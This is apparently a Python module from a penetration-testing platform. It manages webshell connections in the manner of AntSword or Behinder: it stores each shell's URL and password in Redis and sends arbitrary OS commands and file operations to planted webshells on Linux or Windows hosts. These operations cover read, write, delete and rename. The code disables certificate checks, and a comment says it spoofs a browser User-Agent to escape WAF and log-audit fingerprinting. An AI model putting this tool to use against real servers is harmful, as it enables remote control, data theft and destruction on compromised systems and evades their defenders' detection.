"""WebShell 管理 — 参照 CyberStrikeAI 的 webshell 管理功能。

连接存 Redis,执行命令时作为 HTTP 代理向 webshell URL 发请求
(pass=<password>&<cmdParam>=<command>),返回按编码解码后的输出。类似冰蝎/蚁剑。
"""

import json
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from datetime import datetime

_CONN_KEY = lambda cid: f"fs3:webshell:conn:{cid}"  # noqa: E731
_LIST_KEY = "fs3:webshell:connections"
_HIST_KEY = lambda cid: f"fs3:webshell:history:{cid}"  # noqa: E731
_HIST_MAX = 200

# 上传内容前缀:build_file_command 检测到该前缀时认为 content 已是 base64,直接使用(支持二进制文件)
_B64_PREFIX = "FS3B64:"

# 浏览器 UA(2026-08 起不再带 FlowScan-WebShell 工具特征,防 WAF/日志审计指纹)
_DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

# 单次执行输出上限(防 cat 大文件全量进内存/前端)
_MAX_READ = 1_000_000


def decode_output(raw: bytes, encoding: str = "auto") -> str:
    """按目标编码把 webshell 返回字节解码为 UTF-8 文本。"""
    if not raw:
        return ""
    enc = (encoding or "auto").lower()
    if enc in ("utf-8", "utf8"):
        return raw.decode("utf-8", errors="replace")
    if enc in ("gbk", "gb18030"):
        try:
            return raw.decode("gb18030", errors="replace")
        except Exception:
            return raw.decode("utf-8", errors="replace")
    # auto:先试 utf-8,失败回退 gb18030(GBK 超集)
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        try:
            return raw.decode("gb18030", errors="replace")
        except Exception:
            return raw.decode("utf-8", errors="replace")


def _json_or_raw(v):
    try:
        return json.loads(v)
    except Exception:
        return v


def list_connections(redis) -> list:
    ids = redis.conn.zrevrange(_LIST_KEY, 0, 500)
    out = []
    for cid in ids:
        raw = redis.conn.hgetall(_CONN_KEY(cid))
        if raw:
            out.append({k: _json_or_raw(v) for k, v in raw.items()})
    return out


def get_connection(redis, conn_id: str):
    raw = redis.conn.hgetall(_CONN_KEY(conn_id))
    return {k: _json_or_raw(v) for k, v in raw.items()} if raw else None


def _normalize(data: dict) -> dict:
    shell_type = (data.get("type") or "php").strip().lower() or "php"
    method = (data.get("method") or "post").strip().lower()
    if method not in ("get", "post"):
        method = "post"
    encoding = (data.get("encoding") or "auto").strip().lower() or "auto"
    if encoding not in ("auto", "utf-8", "utf8", "gbk", "gb18030"):
        encoding = "auto"
    if encoding == "utf8":
        encoding = "utf-8"
    os_tag = (data.get("os") or "auto").strip().lower() or "auto"
    if os_tag not in ("auto", "linux", "windows"):
        os_tag = "auto"
    return {
        "url": (data.get("url") or "").strip(),
        "password": (data.get("password") or "").strip(),
        "type": shell_type,
        "method": method,
        "cmd_param": (data.get("cmd_param") or "cmd").strip() or "cmd",
        "remark": (data.get("remark") or "").strip(),
        "encoding": encoding,
        "os": os_tag,
        "cookie": (data.get("cookie") or "").strip(),
        "timeout": 30,
    }


def create_connection(redis, data: dict) -> dict:
    conn_id = "ws_" + uuid.uuid4().hex[:12]
    now = time.time()
    conn = {"id": conn_id, **_normalize(data),
            "created_at": now, "created_at_iso": datetime.fromtimestamp(now).isoformat()}
    redis.conn.hset(_CONN_KEY(conn_id), mapping={k: json.dumps(v, ensure_ascii=False) if not isinstance(v, str) else v for k, v in conn.items()})
    redis.conn.zadd(_LIST_KEY, {conn_id: now})
    return conn


def update_connection(redis, conn_id: str, data: dict):
    existing = get_connection(redis, conn_id)
    if not existing:
        return None
    # 密码掩码保护:传空/**** 视为"不变"(API 返回打码,编辑时不允许用掩码覆盖真密码)
    if str(data.get("password") or "").strip() in ("", "****"):
        norm = _normalize(data)
        norm["password"] = existing.get("password", "")
    else:
        norm = _normalize(data)
    merged = {**existing, **norm}
    merged["id"] = conn_id
    redis.conn.hset(_CONN_KEY(conn_id), mapping={k: json.dumps(v, ensure_ascii=False) if not isinstance(v, str) else v for k, v in merged.items()})
    return merged


def delete_connection(redis, conn_id: str) -> bool:
    existed = bool(redis.conn.exists(_CONN_KEY(conn_id)))
    redis.conn.delete(_CONN_KEY(conn_id))
    redis.conn.zrem(_LIST_KEY, conn_id)
    return existed


def _resolve_os(conn: dict) -> str:
    os_tag = (conn.get("os") or "auto").lower()
    if os_tag in ("linux", "windows"):
        return os_tag
    t = (conn.get("type") or "").lower()
    return "windows" if t in ("asp", "aspx") else "linux"


def _quote_posix(p: str) -> str:
    return "'" + p.replace("'", "'\\''") + "'"


def _quote_cmd(p: str) -> str:
    if not p:
        return '"./"'
    return '"' + p.replace('"', '""') + '"'


def build_file_command(conn: dict, action: str, path: str, content: str = "", target_path: str = "") -> str:
    """按目标 OS 生成文件操作命令(参照 CyberStrikeAI buildFileCommand)。"""
    os_tag = _resolve_os(conn)
    action = (action or "").lower()
    path = (path or "").strip()
    import base64
    if action == "list":
        p = path or "."
        return ("dir /a " + _quote_cmd(p.replace("/", "\\"))) if os_tag == "windows" else ("ls -la " + _quote_posix(p))
    if action == "read":
        if not path:
            return ""
        return ("type " + _quote_cmd(path.replace("/", "\\"))) if os_tag == "windows" else ("cat " + _quote_posix(path))
    if action == "delete":
        if not path:
            return ""
        return ("del /q /f " + _quote_cmd(path.replace("/", "\\"))) if os_tag == "windows" else ("rm -f " + _quote_posix(path))
    if action == "mkdir":
        if not path:
            return ""
        return ("md " + _quote_cmd(path.replace("/", "\\"))) if os_tag == "windows" else ("mkdir -p " + _quote_posix(path))
    if action == "rename":
        if not path or not target_path:
            return ""
        if os_tag == "windows":
            return "move /y " + _quote_cmd(path.replace("/", "\\")) + " " + _quote_cmd(target_path.replace("/", "\\"))
        return "mv -f " + _quote_posix(path) + " " + _quote_posix(target_path)
    if action == "write":
        if not path:
            return ""
        # 二进制上传:content 以 _B64_PREFIX 开头时视为已是 base64,直接写
        if content.startswith(_B64_PREFIX):
            b64 = content[len(_B64_PREFIX):]
        else:
            b64 = base64.b64encode(content.encode("utf-8")).decode()
        if os_tag == "windows":
            script = "$b=[Convert]::FromBase64String('" + b64 + "');[IO.File]::WriteAllBytes('" + path.replace("/", "\\") + "',$b)"
            return "powershell -NoProfile -NonInteractive -Command \"" + script + "\""
        return "echo '" + b64 + "' | base64 -d > " + _quote_posix(path)
    return ""


def exec_command(conn: dict, command: str, timeout: int = 30):
    """向 webshell URL 发命令,返回 (output, ok, error)。"""
    if not conn:
        return "", False, "connection is nil"
    command = (command or "").strip()
    if not command:
        return "", False, "command is required"
    url = (conn.get("url") or "").strip()
    if not url.startswith(("http://", "https://")):
        return "", False, f"invalid url: {url!r}"
    cmd_param = (conn.get("cmd_param") or "cmd").strip() or "cmd"
    password = conn.get("password") or ""
    form = urllib.parse.urlencode({"pass": password, cmd_param: command})
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE  # webshell 场景常见自签证书,与蚁剑一致
    headers = {"User-Agent": _DEFAULT_UA}
    cookie = conn.get("cookie") or ""
    if cookie:
        headers["Cookie"] = cookie  # 需要登录的 webshell 面板携带会话
    method = (conn.get("method") or "post").lower()
    try:
        if method == "get":
            sep = "&" if "?" in url else "?"
            req = urllib.request.Request(url + sep + form, headers=headers)
        else:
            req = urllib.request.Request(url, data=form.encode("utf-8"),
                                         headers={"Content-Type": "application/x-www-form-urlencoded", **headers})
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            raw = resp.read(_MAX_READ + 1)
            truncated = len(raw) > _MAX_READ
            raw = raw[:_MAX_READ]
            text = decode_output(raw, conn.get("encoding"))
            if truncated:
                text += f"\n...[输出已截断({_MAX_READ // 1024 // 1024}MB 上限)]..."
            return text, resp.status == 200, ""
    except urllib.error.HTTPError as exc:
        raw = exc.read() if exc.fp else b""
        return decode_output(raw, conn.get("encoding")), exc.code == 200, f"HTTP {exc.code}"
    except Exception as exc:
        return "", False, str(exc)


def file_op(conn: dict, action: str, path: str, content: str = "", target_path: str = "", timeout: int = 30):
    """文件操作:list/read/write/delete/mkdir/rename,返回 (output, ok, error)。"""
    cmd = build_file_command(conn, action, path, content, target_path)
    if not cmd:
        return "", False, f"unsupported action or missing path: {action}"
    return exec_command(conn, cmd, timeout=timeout)


# ── 执行历史(审计) ─────────────────────────────────────────────

def push_history(redis, conn_id: str, kind: str, command: str, output: str,
                 ok: bool, error: str = "", ms: int = 0):
    """记录一次执行到该连接的 zset 历史(最新在前),保留最近 _HIST_MAX 条。

    zset member 用 json(含随机 id)保证唯一,score=时间戳。
    """
    if not redis or not conn_id:
        return
    try:
        entry = {
            "id": uuid.uuid4().hex[:8],
            "ts": time.time(),
            "ts_iso": datetime.fromtimestamp(time.time()).isoformat(timespec="seconds"),
            "kind": kind,          # exec / fileop(list/read/write/...)
            "command": command[:500],
            "output": output[:2000],
            "ok": bool(ok),
            "error": error[:300],
            "ms": int(ms or 0),
        }
        member = json.dumps(entry, ensure_ascii=False)
        redis.conn.zadd(_HIST_KEY(conn_id), {member: entry["ts"]})
        redis.conn.zremrangebyrank(_HIST_KEY(conn_id), 0, -_HIST_MAX - 1)
    except Exception:
        pass  # 历史记录失败不影响执行


def list_history(redis, conn_id: str, limit: int = 50) -> list:
    """取该连接最近 limit 条执行历史(最新在前)。"""
    try:
        raw = redis.conn.zrevrange(_HIST_KEY(conn_id), 0, max(0, limit - 1))
        out = []
        for member in raw:
            try:
                out.append(json.loads(member))
            except Exception:
                continue
        return out
    except Exception:
        return []


def clear_history(redis, conn_id: str) -> bool:
    """清空该连接执行历史。"""
    try:
        return bool(redis.conn.delete(_HIST_KEY(conn_id)))
    except Exception:
        return False
